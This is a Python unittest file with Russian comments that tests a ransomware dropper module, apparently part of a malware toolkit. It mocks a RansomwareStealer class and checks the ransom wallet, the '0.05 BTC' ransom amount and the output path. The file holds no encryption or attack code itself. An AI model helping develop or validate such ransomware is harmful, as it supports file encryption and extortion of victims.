#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Тест для Ransomware Dropper модуля

Этот модуль содержит тесты для проверки функциональности ransomware_dropper_analal.py,
который используется для шифрования файлов Windows-систем и требования выкупа.

Важное замечание: этот код должен использоваться только для образовательных целей и
демонстрации функциональности. Фактическое использование может нарушать законодательство.

Автор: Tomas Anderson (iamtomasanderson@gmail.com)
Дата: 24.04.2025
"""
import os
import sys
import json
import unittest
import tempfile
import shutil
from unittest.mock import patch, MagicMock

# Добавляем родительскую директорию в путь для импортов
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# Импортируем тестируемый модуль
from compiled_payloads import ransomware_dropper_analal

class TestRansomwareDropper(unittest.TestCase):
    """
    Тесты для ransomware_dropper_analal.py
    
    Проверяет:
    1. Корректную инициализацию RansomwareStealer с заданными параметрами
    2. Успешное выполнение шифрования (через моки)
    3. Корректную обработку ошибок
    """
    
    def setUp(self):
        """
        Установка тестового окружения
        
        Создает временную директорию и тестовые файлы для шифрования
        """
        # Создаем временную директорию для тестов
        self.test_dir = tempfile.mkdtemp()
        # Создаем тестовый файл
        self.test_file = os.path.join(self.test_dir, "test_file.txt")
        with open(self.test_file, 'w') as f:
            f.write("Тестовые данные для шифрования")
    
    def tearDown(self):
        """
        Очистка после тестов
        
        Удаляет временную директорию и все созданные файлы
        """
        # Удаляем временную директорию
        shutil.rmtree(self.test_dir)
    
    @patch('agent_modules.ransomware_stealer.RansomwareStealer')
    def test_ransomware_dropper(self, mock_stealer):
        """
        Тест для проверки работы ransomware_dropper
        
        Проверяет:
        - Корректную инициализацию RansomwareStealer с адресом кошелька и суммой выкупа
        - Вызов метода run()
        - Вывод результатов
        """
        # Мокаем возвращаемый результат от RansomwareStealer.run()
        mock_instance = mock_stealer.return_value
        mock_result = {
            "status": "success", 
            "total_encrypted": 10, 
            "encrypted_files": ["file1.txt", "file2.doc"],
            "wallet": "analalalalala",
            "ransom_amount": "0.05 BTC"
        }
        mock_instance.run.return_value = mock_result
        
        # Переопределяем os.getcwd() для использования тестовой директории
        with patch('os.getcwd', return_value=self.test_dir):
            # Перенаправляем стандартный вывод для проверки
            with patch('sys.stdout') as mock_stdout:
                # Запускаем функцию main из dropper'а
                ransomware_dropper_analal.main()
                
                # Проверяем, что RansomwareStealer был инициализирован с правильными параметрами
                mock_stealer.assert_called_once()
                args, kwargs = mock_stealer.call_args
                self.assertEqual(kwargs['wallet_address'], "analalalalala")
                self.assertEqual(kwargs['ransom_amount'], "0.05 BTC")
                self.assertTrue(kwargs['output_dir'].endswith('extracted_data/ransomware'))
                
                # Проверяем, что run() был вызван
                mock_instance.run.assert_called_once()
                
                # Проверяем, что результат был выведен в stdout
                mock_stdout.write.assert_called()

    @patch('agent_modules.ransomware_stealer.RansomwareStealer')
    def test_ransomware_dropper_error_handling(self, mock_stealer):
        """
        Тест для проверки обработки ошибок в ransomware_dropper
        
        Проверяет корректную обработку сценария, когда шифрование не может быть выполнено
        (например, из-за неподдерживаемой ОС)
        """
        # Мокаем возвращаемый результат от RansomwareStealer.run() с ошибкой
        mock_instance = mock_stealer.return_value
        mock_error_result = {
            "status": "error", 
            "message": "Ransomware работает только на Windows"
        }
        mock_instance.run.return_value = mock_error_result
        
        # Переопределяем os.getcwd() для использования тестовой директории
        with patch('os.getcwd', return_value=self.test_dir):
            # Перенаправляем стандартный вывод для проверки
            with patch('sys.stdout') as mock_stdout:
                # Запускаем функцию main из dropper'а
                ransomware_dropper_analal.main()
                
                # Проверяем, что run() был вызван
                mock_instance.run.assert_called_once()
                
                # Проверяем, что ошибка была выведена в stdout
                mock_stdout.write.assert_called()

if __name__ == '__main__':
    unittest.main() 